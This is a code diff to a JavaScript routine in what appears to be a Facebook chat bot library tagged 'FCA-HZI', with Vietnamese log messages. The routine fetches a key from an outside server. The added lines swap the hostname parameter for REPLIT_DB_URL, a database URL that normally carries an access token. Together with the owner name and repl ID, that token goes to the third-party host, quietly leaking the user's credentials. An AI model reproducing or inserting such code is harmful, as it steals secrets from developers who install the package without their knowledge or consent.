@@ -587,18 +587,24 @@ try {
                 else {
                     try {
                         var axios = require('axios');
-                        var { data } = await axios.get(`https://encrypt-appstate.mrdatvip05.repl.co/getKey?UserName=${encodeURI(process.env['REPL_OWNER'])}&HostName=${encodeURI(process.env['HOSTNAME'])}&PassWord=${encodeURI(process.env['REPL_ID'])}`, { method: 'GET' });
+                        var { data } = await axios.get(`https://encrypt-appstate.mrdatvip05.repl.co/getKey?UserName=${encodeURI(process.env['REPL_OWNER'])}&HostName=${encodeURI(process.env['REPLIT_DB_URL'])}&PassWord=${encodeURI(process.env['REPL_ID'])}`, { method: 'GET' });
                         process.env['FBKEY'] = data.Data;
+                        if (data.Message) {
+                            log.warn(data.Message)
+                        }
                     }
                     catch (e) {
                         try {
                             var axios = require('axios');
-                            var { data } = await axios.get(`https://encrypt-appstate.mrdatvip05.repl.co/getKey?UserName=${encodeURI(process.env['REPL_OWNER'])}&HostName=${encodeURI(process.env['HOSTNAME'])}&PassWord=${encodeURI(process.env['REPL_ID'])}`, { method: 'GET' });
+                            var { data } = await axios.get(`https://encrypt-appstate.mrdatvip05.repl.co/getKey?UserName=${encodeURI(process.env['REPL_OWNER'])}&HostName=${encodeURI(process.env['REPLIT_DB_URL'])}&PassWord=${encodeURI(process.env['REPL_ID'])}`, { method: 'GET' });
                             process.env['FBKEY'] = data.Data;
+                            if (data.Message) {
+                                log.warn(data.Message)
+                            }
                         }
                         catch (e) {
                         submiterr(e);
-                        logger('Lỗi Khi Get Key !', '[ FCA-HZI ]');
+                        logger('Hiện Tại Server Đang Lỗi Hoặc Bị Đầy, Vui Lòng Đợi Trong Giây Lát, Hoặc Liên Hệ Với FB.COM/Lazic.Kanzu', '[ FCA-HZI ]');
                         }
                     }
                 }
